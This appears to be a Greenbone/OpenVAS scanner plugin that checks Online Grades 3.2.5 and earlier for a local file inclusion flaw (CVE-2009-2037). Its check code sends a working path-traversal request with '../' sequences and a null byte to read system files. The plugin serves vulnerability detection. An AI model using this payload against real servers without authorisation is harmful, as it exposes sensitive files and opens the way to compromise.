CPE = "cpe:/a:onlinegrades:online_grades";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100875" );
	script_version( "2021-06-28T11:17:55+0000" );
	script_tag( name: "last_modification", value: "2021-06-28 11:17:55 +0000 (Mon, 28 Jun 2021)" );
	script_tag( name: "creation_date", value: "2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-2037" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Online Grades Multiple <= 3.2.5 LFi Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_online_grades_http_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "online_grades/http/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "Online Grades is prone to multiple local file-include
  vulnerabilities because it fails to properly sanitize user-supplied input.

  An attacker with admin access can exploit these vulnerabilities to obtain potentially sensitive
  nformation and to execute arbitrary local scripts in the context of the webserver process. This
  may allow the attacker to compromise the application and the computer, other attacks are also
  possible." );
	script_tag( name: "affected", value: "Online Grades 3.2.5 and prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/44399" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/index.php?GLOBALS[SKIN]=" + crap( data: "../", length: 3 * 9 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file, extra_check: make_list( "Student Login",
		 "Student ID" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

